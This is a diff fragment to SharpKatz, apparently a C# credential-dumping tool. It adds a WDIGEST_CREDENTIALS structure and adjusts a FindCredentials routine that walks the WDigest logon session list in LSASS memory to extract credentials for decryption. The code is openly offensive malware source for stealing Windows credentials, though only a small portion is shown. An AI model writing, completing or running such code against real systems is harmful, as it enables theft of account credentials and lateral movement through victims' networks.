@@ -27,9 +27,20 @@ namespace SharpKatz.Module
             public Natives.UNICODE_STRING Password; // 0x50
         }
 
+        [StructLayout(LayoutKind.Sequential)]
+        public struct WDIGEST_CREDENTIALS
+        {
+            public byte Reserverd1;
+            public byte Reserverd2;
+            public byte Version;
+            public byte NumberOfHashes;
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 12)]
+            public byte[] Reserverd3;
+            public IntPtr Hash;
+        }
 
         // Hunts through wdigest and extracts credentials to be decrypted
-        public static unsafe int FindCredentials(IntPtr hLsass, IntPtr wdigestMem, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, List<Logon> logonlist)
+        public static int FindCredentials(IntPtr hLsass, IntPtr wdigestMem, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, List<Logon> logonlist)
         {
 
             KIWI_WDIGEST_LIST_ENTRY entry;
@@ -41,14 +52,14 @@ namespace SharpKatz.Module
 
             //Console.WriteLine("[*] l_LogSessList found at address {0:X}", logSessListAddr.ToInt64());
 
-            byte[] entryBytes = Utility.ReadFromLsass(ref hLsass, logSessListAddr, Convert.ToUInt64(sizeof(KIWI_WDIGEST_LIST_ENTRY)));
+            byte[] entryBytes = Utility.ReadFromLsass(ref hLsass, logSessListAddr, Convert.ToUInt64(Marshal.SizeOf(typeof(KIWI_WDIGEST_LIST_ENTRY))));
             IntPtr pThis = new IntPtr(BitConverter.ToInt64(entryBytes, Utility.FieldOffset<KIWI_WDIGEST_LIST_ENTRY>("This")));
 
             llCurrent = pThis;
 
             do
             {
-                entryBytes = Utility.ReadFromLsass(ref hLsass, llCurrent, Convert.ToUInt64(sizeof(KIWI_WDIGEST_LIST_ENTRY)));
+                entryBytes = Utility.ReadFromLsass(ref hLsass, llCurrent, Convert.ToUInt64(Marshal.SizeOf(typeof(KIWI_WDIGEST_LIST_ENTRY))));
                 entry = Utility.ReadStruct<KIWI_WDIGEST_LIST_ENTRY>(entryBytes);
 
                 if (entry.UsageCount == 1)
